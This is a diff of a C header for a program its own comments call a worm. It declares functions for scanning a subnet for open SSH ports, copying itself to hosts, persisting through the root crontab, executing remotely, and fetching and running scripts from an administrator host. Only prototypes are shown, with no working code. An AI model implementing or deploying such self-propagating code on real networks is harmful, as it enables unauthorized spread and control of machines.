@@ -14,7 +14,11 @@
 
  #define CMD_LEN 4096
  #define IP_LEN 16
- #define RESULTS "vaccin.log"
+
+ /*
+ * Parameters of the configuration file
+ */
+ dictionary *params;
 
  /*
  * Check if the program is launched by root
@@ -22,83 +26,88 @@
  bool isRoot();
 
  /*
- * Check if a network interface on the system is identical to the administrator ip address
+ * Check if a network interface on the system is configured with the administrator ip address
  */
- bool isSourceHost(char *adminIP);
+ bool isSourceHost();
 
  /*
- * Scan sub network and check for each address if the given port is opened
+ * Scan subnetwork and check for each ip address if the ssh port is opened
  */
- struct in_addr* scanNetwork(char *adminIP, char *broadcastAddr, int portSSH);
+ struct in_addr* scanNetwork();
 
  /*
- * Check if the target host is already colonized (check if the worm exists on the target host)
+ * Check if the target host is already colonized by the worm
  */
- bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *dstDir);
+ bool isAlreadyColonized(char *target_ip, char *worm_name);
 
  /*
- * Colinize a target host (copy the worm, the configuration file and update the root crontab)
+ * Colinize a target host
  */
- bool colonize(char *host, char *sshPath, int portSSH, char *scpPath, char *srcFile, char *dstDir, char *crontab);
+ bool colonize(char *target_ip, char *worm_name);
 
  /*
- * Check if the worm is allowed to be launched on the system (if the parameter is a file and exists)
+ * Check if the worm is authorized to be executed
  */
- bool isAuthorized(char *control);
+ bool isAuthorized();
 
  /*
- * Delete the worm, the configuration file and restore the root crontab
+ * Delete the worm
  */
- bool wormDelete(char *programName, char *targetPath, char *crontab);
+ bool wormDelete(char *worm_name);
 
  /*
- * Download a command file on the administrator host, execute it and send results back
+ * Get informations on the host
  */
- bool informationsRecovery(char *srcCommand, char *dstPath, char *control, char *adminIP, char *scpPath, int portSSH);
+ bool infosRecovery();
 
  /*
- * If the given ip address is defined in a network interface, returns the network mask address
+ * Get the network mask of an interface configured with the given ip address
  */
  char* getNetworkMask(char *ip);
 
  /*
  * Upload a file on a target host
  */
- bool uploadFile(char *srcFile, char *dstFile, char *host, char *scpPath, int portSSH);
+ bool uploadFile(char *srcFile, char *dstFile, char *ip);
 
  /*
- * Reset the root crontab on the target host
+ * Remove the worm from the root crontab of a target host
  */
- bool restoreTargetCrontab(char *crontab, char *dstFile, char *host, char *sshPath, int portSSH);
+ bool restoreTargetCrontab(char *target_ip, char *worm_name);
 
  /*
- * Update the root crontab on the target host
+ * Add the worm inside the root crontab of a target host
  */
- bool updateTargetCrontab(char *crontab, char *dstFile, char *host, char *sshPath, int portSSH);
+ bool updateTargetCrontab(char *target_ip, char *worm_name);
 
  /*
  * Execute a remote program on the target host
  */
- bool execRemote(char *dstFile, char *host, char *sshPath, int portSSH);
+ bool execRemote(char *target_ip, char *program);
 
  /*
  * Retore the local root crontab
  */
- bool restoreLocalCrontab(char *crontab, char *srcFile);
+ bool restoreCrontab(char *worm_name);
 
  /*
- * Delete the local file
+ * Delete file
  */
- bool deleteLocalFile(char *srcFile);
+ bool deleteFile(char *file);
 
  /*
- * Download a command file from the administrator host
+ * Download a script from the administrator host
  */
- bool downloadCommand(char *srcCommand, char *adminIP, char *dstPath, char *scpPath, int portSSH);
+ bool downloadScript();
 
  /*
- * Execute a program and write results in a log file
+ * Execute the script and save output in a log file
  */
- bool executeCommand(char *commandFile);
+ bool executeScript();
+ 
+ /*
+ * Get the log filename where results of the script will stored
+ */
+ char* getLogFilename();
 
 #endif /* VACCCIN_H */
